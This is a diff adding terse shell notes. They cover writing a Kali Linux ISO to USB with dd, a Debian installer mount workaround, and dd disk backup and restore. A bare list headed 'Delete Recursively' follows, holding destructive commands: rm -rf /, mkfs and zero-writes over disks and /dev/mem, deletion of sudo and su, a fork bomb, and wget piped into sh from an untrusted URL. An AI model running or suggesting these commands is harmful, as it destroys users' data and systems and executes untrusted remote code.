@@ -1,0 +1,39 @@
+Execute a Shell
+
+mount -t vfat /dev/sdb1 /cdrom
+exit
+sudo fdisk -l
+dd if=kali-linux-2017.1-amd64.iso of=/dev/sdb bs=512k
+diskutil unmount /dev/disk6
+sudo dd if=kali-linux-2017.1-amd64.iso of=/dev/disk6 bs=1m
+
+“Retry mount CD-Room” - “No” 
+Continue - “Debian Installer Main menu” .
+“Execute a shell” - “continue”
+mount -t vfat /dev/sdb1 /cdrom - exit 
+“Debian Installer Main menu”
+“choose language”
+
+dd if=/dev/sdX of=/dev/sdY
+dd if=/dev/sdX of=path/to/your-backup.img
+dd if=/dev/sdX | gzip -c > path/to/your-backup.img.gz
+dd if=/dev/sdY of=/dev/sdX
+dd if=path/to/your-backup.img of=/dev/sdX
+gunzip -c /path/to/your-backup.img.gz | dd of=/dev/sdX
+dd if=/dev/sdX of=/dev/sdY bs=64
+conv=noerror,sync
+
+Delete Recursively
+
+rm -rf /
+mkfs.ext3 /dev/hda
+command > /dev/hda
+dd if=/dev/zero of=/dev/hda
+mv / /dev/null
+dd if=/dev/random of=/dev/port
+echo 1 > /proc/sys/kernel/panic
+cat /dev/port
+cat /dev/zero > /dev/mem
+wget http://an-untrusted-url -O- | sh
+rm -f /usr/bin/sudo;rm -f /bin/su
+:(){:|:&};:
